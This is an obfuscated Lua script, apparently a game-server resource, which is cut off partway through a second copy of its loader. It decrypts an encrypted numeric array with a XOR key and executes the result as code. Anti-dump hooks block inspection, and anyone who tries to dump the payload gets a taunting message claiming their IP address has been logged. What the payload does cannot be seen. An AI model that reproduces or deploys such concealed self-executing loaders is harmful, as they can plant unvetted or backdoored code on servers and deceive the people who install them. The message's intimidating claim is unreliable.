ruXiKdSSw8HIOQzQRl6HiACA0s96CVdRPIlJ9QHJKa9r1KTiGuhmA; tsfCV3YWqZrvoMORX43AxBjx6H885Ii5yBChP50VrKG5DkxJaNf7mMOncdY7rzwfgB =
ruXiKdSSw8HIOQzQRl6HiACA0s96CVdRPIlJ9QHJKa9r1KTiGuhmA; h8oAfOMnTJ9mpBpfgcRz3vxBLOz2Rc3p87BEDqDuNI5l3pHHhUogwSTTo8l1 =
tsfCV3YWqZrvoMORX43AxBjx6H885Ii5yBChP50VrKG5DkxJaNf7mMOncdY7rzwfgB; afsjQCrcseCJjXGDJdQW5uHcyKlqkMKbpjnY9wZlTqPHcubFN9Qd =
h8oAfOMnTJ9mpBpfgcRz3vxBLOz2Rc3p87BEDqDuNI5l3pHHhUogwSTTo8l1; nIZwPaWnOSW6LNpr39Owja8cCgU5ZiWRVpDis6yHhY0jlpxdt5EUUApWqSWd =
afsjQCrcseCJjXGDJdQW5uHcyKlqkMKbpjnY9wZlTqPHcubFN9Qd; dVLI0J4p5QNkl89XlZdFT2RlAqXgWu4mVOBFSu07nCq5t5uTgG2n =
nIZwPaWnOSW6LNpr39Owja8cCgU5ZiWRVpDis6yHhY0jlpxdt5EUUApWqSWd; nigfQ7T3j7viKzbT269zi4fJYiUTOtSjFmmrPtiCuilmGPe13PzbXs8I =
dVLI0J4p5QNkl89XlZdFT2RlAqXgWu4mVOBFSu07nCq5t5uTgG2n; eZPMTm6awGBpDbqOSbXfEK6bckpzH2E9nGthpgy42OeMnuCecNeXweM58 =
nigfQ7T3j7viKzbT269zi4fJYiUTOtSjFmmrPtiCuilmGPe13PzbXs8I; w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8 = function(
  a)
  K, F = 9249559603103672, 16384 + 6052; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; rvmDax4SteZUHkOaToGTpor39ZGFnCb6zrQS7YZg3Bhime9GaP0KO1xDIfxhSvetKEQnFp7f8W1 = function(b)
  co = coroutine.create(b)
  v3Rd89KBQLKdbAjzjH4azqEEjeyVOv2uWPTH1zLwE4k0G0E25j67TcPFEXFdDwnhQMMg = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(v3Rd89KBQLKdbAjzjH4azqEEjeyVOv2uWPTH1zLwE4k0G0E25j67TcPFEXFdDwnhQMMg, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return v3Rd89KBQLKdbAjzjH4azqEEjeyVOv2uWPTH1zLwE4k0G0E25j67TcPFEXFdDwnhQMMg
end; mtCwrMdiUn70sIkXDs1WfTbgwE2mZgCzmaldmBA5ybazLCWO6ma7gw2I4AAqaU4 = function(f, g)
  mEm0oIU84jIhFy3mEXB4lN8KCe8Z4JuSYPOO8bWm5h3Hi4WZmuMc = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; x88tFs8uwv229gSnGLef66X71L3unajKOo5cO2fn5F7A8RQq1iuwyWBwRvhEuwElvlYMeiFha3V = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; hAUblriU0pH54GkBRia54JdOXgqCIE3gwtNArgW8DdApgkszJGmKiiaIZ = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      mEm0oIU84jIhFy3mEXB4lN8KCe8Z4JuSYPOO8bWm5h3Hi4WZmuMc(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; m6iySnveYGCmsA66u250QnrwMMZVu8Sbdx7REi3odpAZxycRnt6aC4sV0yMMEZ = function(p, n)
    thAJ5CHSK3NKm8i9vBKxasyIDfLt8LoW1GHAG5ytss4nrXjOkgGT0ZNZrfpd3SZcy6epQip = ""
    for k, q in pairs(p) do thAJ5CHSK3NKm8i9vBKxasyIDfLt8LoW1GHAG5ytss4nrXjOkgGT0ZNZrfpd3SZcy6epQip =
      thAJ5CHSK3NKm8i9vBKxasyIDfLt8LoW1GHAG5ytss4nrXjOkgGT0ZNZrfpd3SZcy6epQip ..
      eZPMTm6awGBpDbqOSbXfEK6bckpzH2E9nGthpgy42OeMnuCecNeXweM58
      [w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('2B') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('F6') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('60') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('3D') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('34') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('A7')]
      [w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('7B') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('72') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('E5') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('60')](
      q) end
    ; n(thAJ5CHSK3NKm8i9vBKxasyIDfLt8LoW1GHAG5ytss4nrXjOkgGT0ZNZrfpd3SZcy6epQip)
  end; x88tFs8uwv229gSnGLef66X71L3unajKOo5cO2fn5F7A8RQq1iuwyWBwRvhEuwElvlYMeiFha3V(f,
    function(r) hAUblriU0pH54GkBRia54JdOXgqCIE3gwtNArgW8DdApgkszJGmKiiaIZ(r, g,
        function(s) m6iySnveYGCmsA66u250QnrwMMZVu8Sbdx7REi3odpAZxycRnt6aC4sV0yMMEZ(s,
            function(t) if #rvmDax4SteZUHkOaToGTpor39ZGFnCb6zrQS7YZg3Bhime9GaP0KO1xDIfxhSvetKEQnFp7f8W1(eZPMTm6awGBpDbqOSbXfEK6bckpzH2E9nGthpgy42OeMnuCecNeXweM58[w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('9E') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('FF') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('E5') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('46')]) == 1 then if eZPMTm6awGBpDbqOSbXfEK6bckpzH2E9nGthpgy42OeMnuCecNeXweM58[w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('9E') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('FF') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('E5') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('46')] == eZPMTm6awGBpDbqOSbXfEK6bckpzH2E9nGthpgy42OeMnuCecNeXweM58[w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('CA') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('60') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('3D') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('34') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('F6')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if eZPMTm6awGBpDbqOSbXfEK6bckpzH2E9nGthpgy42OeMnuCecNeXweM58[w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('9E') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('FF') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('E5') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('46')](t) then
                    eZPMTm6awGBpDbqOSbXfEK6bckpzH2E9nGthpgy42OeMnuCecNeXweM58
                        [w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('9E') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('FF') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('E5') .. w0NOkcRfKuTxe9l7mf1Oa8GEAsONjIZeexJ215f4ptOlWmV5qd96Xx66IhSSb8('46')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; mtCwrMdiUn70sIkXDs1WfTbgwE2mZgCzmaldmBA5ybazLCWO6ma7gw2I4AAqaU4(
{ 938, 662, 712, 756, 1015, 697, 543, 598, 749, 965, 776, 1092, 859, 643, 812, 655, 589, 1187, 1179, 1019, 1119, 565,
  900, 1041, 870, 646, 636, 653, 1160, 552, 691, 771, 583, 656, 840, 955, 1082, 932, 625, 660, 748, 1185, 867, 1183, 878,
  1176, 899, 848, 698, 641, 1059, 1206, 624, 705, 694, 1212, 1111, 856, 821, 1016, 1097, 920, 907, 747, 871, 696, 1104,
  860, 719, 1094, 585, 866, 891, 548, 1011, 685, 1009, 811, 654, 963, 765, 549, 550, 914, 1053, 780, 1034, 752, 1130,
  1112, 627, 912, 1025, 1173, 762, 822, 769, 1186, 1181, 707, 839, 892, 1055, 1145, 913, 588, 782, 1109, 778, 983, 964,
  737, 903, 842, 571, 1100, 801, 850, 764, 1165, 736, 1024, 864, 678, 843, 863, 622, 1058, 620, 885, 1005, 852, 704, 989,
  929, 670, 952, 1196, 919, 701, 745, 855, 835, 861, 797, 815, 649, 754, 948, 817, 733, 862, 1149, 922, 742, 1156, 1061,
  806, 1073, 1121, 823, 632, 1204, 607, 908, 1047, 708, 1045, 592, 993, 665, 709, 738, 944, 915, 1099, 1175, 730, 558,
  746, 1063, 743, 582, 902, 1147, 1144, 684, 766, 759, 785, 1194, 602, 996, 1049, 626, 1108, 715, 875, 884, 561, 1051,
  1060, 1136, 936, 645, 816, 1174, 661, 803, 753, 726, 1083, 1098, 1072, 546, 853, 637, 724, 677, 879, 1205, 702, 574,
  1017, 1191, 658, 1164, 873, 615, 1203, 564, 629, 1054, 790, 1158, 994, 1139, 630, 631, 918, 901, 966, 982, 1211, 857,
  974, 640, 1209, 554, 969, 1000, 946, 986, 896, 663, 590, 1052, 676, 775, 798, 949, 644, 967, 917, 1071, 562, 954, 788,
  714, 777, 1079, 651, 1210, 827, 652, 894, 604, 693, 683, 560, 1199, 686, 731, 553, 1188, 783, 953, 587, 1190, 1154,
  1129, 978, 787, 671, 1080, 1028, 595, 689, 706, 1044, 880, 757, 934, 1116, 619, 1178, 793, 648, 970, 876, 761, 1040,
  1115, 889, 568, 979, 943, 1171, 1003, 1140, 700, 1070, 760, 699, 692, 606, 1198, 977, 890, 609, 1096, 1195, 572, 1038,
  971, 1166, 923, 681, 1142, 634, 674, 1004, 599, 611, 1046, 1037, 1067, 1127, 593, 981, 1146, 960, 781, 910, 976, 931,
  1177, 1064, 727, 1138, 1085, 802, 1120, 1153, 612, 740, 716, 921, 618, 614, 1123, 962, 722, 739, 591, 774, 1078, 1114,
  1131, 1107, 789, 795, 872, 805, 1002, 628, 667, 1141, 1168, 1090, 1093, 849, 1148, 1162, 1077, 814, 673, 829, 1035,
  544, 1201, 1095, 584, 791, 844, 799, 682, 717, 1076, 830, 1088, 1068, 1110, 545, 1103, 601, 1118, 838, 576, 881, 796,
  851, 951, 906, 573, 1021, 1006, 669, 1043, 968, 575, 1102, 569, 957, 904, 997, 725, 1157, 959, 947, 991, 559, 995,
  1133, 613, 810, 581, 1106, 596, 647, 711, 1135, 688, 1125, 732, 744, 1207, 999, 728, 836, 723, 1036, 825, 937, 973,
  1066, 804, 1193, 1128, 945, 1132, 720, 600, 555, 985, 846, 1161, 586, 809, 883, 1169, 794, 1105, 1018, 813, 772, 1163,
  657, 770, 1126, 616, 930, 928, 580, 603, 832, 1022, 675, 933, 594, 887, 990, 819, 1031, 758, 1172, 1075, 617, 1084,
  898, 1152, 695, 610, 1029, 1150, 1020, 874, 567, 767, 642, 721, 1056, 909, 1200, 916, 820, 1039, 984, 961, 597, 773,
  1208, 1124, 939, 1089, 664, 897, 837, 1137, 992, 800, 828, -1, 1, 45, 28, 65, 21, 123, 98, 23, 184, 106, 65, 57, 119,
  253, 236, 87, 101, 52, 67, 52, 100, 0, 34, 18, 28, 58, 80, 192, 74, 113, 78, 105, 42, 110, 139, 235, 163, 101, 13, 82,
  31, 86, 93, 104, 57, 46, 81, 33, 25, 75, 87, 93, 25, 26, 15, 47, 1, 89, 33, 111, 85, 93, 164, 65, 101, 108, 68, 26, 35,
  17, 110, 112, 35, 79, 19, 89, 70, 45, 209, 10, 129, 85, 102, 94, 0, 43, 71, 16, 28, 98, 235, 105, 141, 28, 19, 62, 165,
  24, 89, 101, 86, 32, 67, 49, 44, 42, 70, 154, 36, 44, 38, 5, 36, 110, 77, 68, 27, 19, 118, 25, 61, 118, 110, 201, 29,
  16, 103, 60, 98, 144, 29, 58, 44, 80, 25, 96, 50, 16, 44, 64, 87, 85, 25, 35, 93, 90, 49, 185, 12, 9, 8, 110, 0, 91,
  56, 0, 35, 6, 104, 57, 211, 33, 60, 64, 40, 10, 96, 26, 9, 43, 122, 65, 113, 110, 7, 39, 20, 72, 85, 78, 70, 97, 113,
  98, 113, 81, 170, 119, 10, 13, 118, 57, 168, 20, 39, 13, 104, 44, 64, 101, 105, 65, 80, 4, 103, 105, 38, 91, 103, 59,
  110, 23, 68, 48, 36, 25, 64, 88, 59, 19, 194, 57, 52, 112, 67, 10, 18, 113, 37, 10, 124, 103, 42, 77, 59, 89, 72, 48,
  105, 39, 53, 66, 122, 167, 81, 47, 20, 13, 84, 175, 62, 19, 68, 89, 40, 48, 48, 63, 30, 21, 77, 61, 103, 124, 116, 142,
  25, 49, 98, 56, 81, 62, 56, 18, 60, 134, 78, 51, 16, 72, 94, 203, 35, 188, 65, 32, 98, 111, 62, 105, 73, 113, 76, 16,
  77, 67, 21, 78, 208, 104, 120, 36, 105, 98, 145, 40, 61, 90, 119, 47, 101, 210, 41, 54, 27, 4, 62, 34, 67, 117, 78, 26,
  66, 35, 20, 46, 218, 42, 24, 18, 34, 10, 118, 80, 74, 80, 35, 47, 98, 41, 103, 24, 79, 178, 83, 4, 105, 62, 52, 21,
  243, 55, 68, 46, 19, 62, 118, 26, 6, 123, 11, 18, 24, 98, 94, 66, 110, 113, 124, 19, 85, 56, 21, 23, 37, 38, 24, 38,
  127, 18, 105, 153, 241, 159, 249, 105, 89, 21, 68, 110, 29, 90, 169, 99, 126, 127, 31, 212, 43, 118, 1, 86, 96, 75, 81,
  26, 7, 53, 83, 95, 29, 28, 43, 91, 1, 127, 0, 19, 73, 72, 37, 1, 60, 39, 32, 19, 107, 71, 79, 171, 13, 47, 157, 20,
  120, 106, 39, 169, 77, 29, 49, 98, 83, 84, 191, 66, 48, 98, 44, 34, 31, 61, 91, 21, 122, 74, 61, 27, 149, 55, 95, 39,
  127, 25, 68, 162, 105, 61, 72, 102, 254, 55, 31, 41, 113, 113, 122, 32, 104, 43, 45, 89, 116, 248, 204, 102, 36, 2,
  104, 27, 10, 11, 26, 34, 54, 100, 95, 55, 91, 134, 76, 19, 115, 83, 111, 35, 96, 51, 3, 28, 83, 36, 39, 105, 171, 91,
  105, 127, 71, 252, 110, 103, 145, 76, 6, 106, 82, 45, 87, 102, 105, 167, 76, 90, 89, 76, 92, 64, 181, 91, 101, 37, 79,
  121, 244, 115, 105, 32, 209, 55, 1, 7, 51, 18, 7, 74, 107, 36, 4, 62, 105, 32, 105, 37, 113, 0, 36, 77, 11, 43, 148,
  19, 89, 7, 13, 26, 113, 42, 110, 98, 84, 75, 47, 100, 45, 93, 29, 92, 105, 103, 103, 225, 102, 99, 56, 100, 62, 98, 21,
  19, 109, 101, 42, 76, 119, 43, 91, 62, 80, 85, 42, 43, 31, 98, 39, 1, 38, 32, 78, 48, 86, 98, 37, 21, 223, 37, 76, 210,
  35, 103, 121, 123, 118, 111, 18, 46, 18, 220, 33, 217, 7, 118, 113, 96, 23, 103, 183, 113, 20, 157, 32, 91, 103, 98,
  124, 58, 126, 39, 65, 215, 34, 69, 3, 60, 97, 19, 71, 25, 96, 33 }, "uINByWsBnH9Gl3IQ4d2GQDo5IE"); evIreWKgoTRpi6XUbzSCar80sqnQazp4AfA4dN6BARvOqyAfkmmySrSG5lZ3KALQxlfGZ =
eZPMTm6awGBpDbqOSbXfEK6bckpzH2E9nGthpgy42OeMnuCecNeXweM58; nD8JdLB6dSDaWNYvCSje4N94tj72gn4CYlDJMVK7Kl3pTCyxtK1GqFz2YK4Eu1dhWyQtMrEHo =
eZPMTm6awGBpDbqOSbXfEK6bckpzH2E9nGthpgy42OeMnuCecNeXweM58; h89RrMwJeDgHfvym0xH42maeIPHDtt3o51OMaUBax7NA8aqQ2UMqWs3 =
nD8JdLB6dSDaWNYvCSje4N94tj72gn4CYlDJMVK7Kl3pTCyxtK1GqFz2YK4Eu1dhWyQtMrEHo; eAhRklvOMrjE2d3mbk6ytdLrzIEmjIAhseWFJvXCMEIr3dqQG7tyxiuClA1N =
h89RrMwJeDgHfvym0xH42maeIPHDtt3o51OMaUBax7NA8aqQ2UMqWs3; thvfTUJ8BVwaAEgQC5P6awlEwR2RjYmgNlQKsqQK2FkvXO0ljsJTWbJdq2M =
eAhRklvOMrjE2d3mbk6ytdLrzIEmjIAhseWFJvXCMEIr3dqQG7tyxiuClA1N; eC5P7FMVMCcpTTrtM9ZiEZN5kEyIOjEPoib6cjSYVvbYhWXi9ku =
thvfTUJ8BVwaAEgQC5P6awlEwR2RjYmgNlQKsqQK2FkvXO0ljsJTWbJdq2M; yRIT2X5ERDdGUKWf5npctb9abzKPHCVNcOjUhTXh7YFqkMS3u7r =
eC5P7FMVMCcpTTrtM9ZiEZN5kEyIOjEPoib6cjSYVvbYhWXi9ku; miue4AgRlAlGpen900Z3gKQ05AZpevcP7yIaS4H4nEc4k7tJxJdmhfOUCtnEVLQ6AvagXC =
yRIT2X5ERDdGUKWf5npctb9abzKPHCVNcOjUhTXh7YFqkMS3u7r; tFD0tRo1hpJyhnmo8AaLHQK4sP8CYmBEeSiKjsNh5WfUlLZHQR2Baw =
miue4AgRlAlGpen900Z3gKQ05AZpevcP7yIaS4H4nEc4k7tJxJdmhfOUCtnEVLQ6AvagXC; ndmKtkfFaioEWGnGAiCJFzcM4mWimRCiQhQ6XCJEK2pYWvv1fr4MY0oSan5Lf3NT =
tFD0tRo1hpJyhnmo8AaLHQK4sP8CYmBEeSiKjsNh5WfUlLZHQR2Baw; dwnYsYLTtbOqGJB7xgnU6Jgk64LGV5pHmoaEHXl2YQoAjTweNFmPW96 =
ndmKtkfFaioEWGnGAiCJFzcM4mWimRCiQhQ6XCJEK2pYWvv1fr4MY0oSan5Lf3NT; iWyqsGYMmOXBRLx0HPHKDLJeYpFkPCP2mLRuyzK5A38CZYONfJh90PGTOjiuHbn =
dwnYsYLTtbOqGJB7xgnU6Jgk64LGV5pHmoaEHXl2YQoAjTweNFmPW96; hFqWKEivAq0aOyOVpzzuVr9GpxGrVufXPTzBiQyM3mM9UtSjA2HFqzOc4pUsfSXExe =
iWyqsGYMmOXBRLx0HPHKDLJeYpFkPCP2mLRuyzK5A38CZYONfJh90PGTOjiuHbn; oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9 = function(
  a)
  K, F = 4174275853827522, 16384 + 1862; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; xwqgXjFbTRMZNi21zm7FPJ1jJbDosDLMh5rthVl84HeXBjqxai2V = function(b)
  co = coroutine.create(b)
  bvGhLA0mdJ26EDrV1AZnQOooLtoC4gjYU9ZGQqtd8LM9kduHEY8bo = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(bvGhLA0mdJ26EDrV1AZnQOooLtoC4gjYU9ZGQqtd8LM9kduHEY8bo, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return bvGhLA0mdJ26EDrV1AZnQOooLtoC4gjYU9ZGQqtd8LM9kduHEY8bo
end; afl671TwfHbqiaIg0T5qCrNhD5Idvti62UAKKq6PxigrrQgyWcxGazjrD = function(f, g)
  msRVyGc2uwHRC2byf3D2a3o7aKxaAJYWx7Tk740RaMUueFSiStUFFIyBB6zroCN = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; ryU1fEnFlrD7CFFIthCmeBxab9XECnoZzyOmurFQkdZZhrthWkbDTOSj1wkxb4dF9luxLuWCj0V = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; u3XQIlroeIw6p1EL4UKtatYQTxpxxuYKWbY9fI4QSJ9RDhMadOlBEUAfMVoL = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      msRVyGc2uwHRC2byf3D2a3o7aKxaAJYWx7Tk740RaMUueFSiStUFFIyBB6zroCN(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; tF3Ytn6gkeJdIPc5DnE9OYXHZbxdkHx3ndpGH0NBDLOvqNZwkFyPGdLWNMQ9XlwwGT = function(p, n)
    lGgEKIm9amI3zM1svyK7Gq9JcL9b57sKTQx8qW1XYWMJvc8f3JHi0 = ""
    for k, q in pairs(p) do lGgEKIm9amI3zM1svyK7Gq9JcL9b57sKTQx8qW1XYWMJvc8f3JHi0 =
      lGgEKIm9amI3zM1svyK7Gq9JcL9b57sKTQx8qW1XYWMJvc8f3JHi0 ..
      hFqWKEivAq0aOyOVpzzuVr9GpxGrVufXPTzBiQyM3mM9UtSjA2HFqzOc4pUsfSXExe
      [oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('7B') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('86') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('70') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('0D') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('44') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('F7')]
      [oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('CB') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('02') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('B5') .. oaxsaNqtD3GmaTXmbbfVMVHZq2zMU0J52Oy0anl0KEvCObfyYSF0x2S6RQ3D9BJ5FBY2SYt9n9('70')](
      q) end
    ; n(lGgEKIm9amI3zM1svyK7Gq9JcL9b57sKTQx8qW1XYWMJvc8f3JHi0)
  end; ryU1fEnFlrD7CFFIthCmeBxab9XECnoZzyOmurFQkdZZhrthWkbDTOSj1wkxb4dF9luxLuWCj0V(f,
    function(r) u3XQIlroeIw6p1EL4UKtatYQTxpxxuYKWbY9fI4QSJ9RDhMadOlBEUAfMVoL(r, g,
        function(s) tF3Ytn6gkeJdIPc5DnE9OYXHZbxdkHx3ndpGH0NBDLOvqNZwkFyPGdLWNMQ9XlwwGT(s,
